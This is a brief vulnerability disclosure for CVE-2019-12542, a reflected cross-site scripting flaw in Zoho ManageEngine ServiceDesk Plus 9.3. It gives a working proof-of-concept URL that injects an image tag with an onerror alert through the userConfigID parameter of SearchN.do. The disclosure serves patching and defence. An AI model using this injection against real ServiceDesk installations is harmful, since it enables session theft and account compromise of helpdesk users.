# CVE-2019-12542 Zoho ManageEngine ServiceDesk Plus 9.3 XSS vulnerability in SearchN.do
 Information Description: An issue was discovered in Zoho ManageEngine ServiceDesk Plus 9.3. There is XSS via the SearchN.do userConfigID parameter. 
 
**Author: Concobe of Tarantula Team - VinCSS (a member of Vingroup)** 

 # Payload
 domain/SearchN.do?searchText=a&SELECTEDSITEID=1&SELECTEDSITENAME=&configID=0&SELECTSITE=qc_siteID&submitbutton=Go&userConfigID=1"><img src%3da onerror%3dalert('XSS')>&selectName=Site
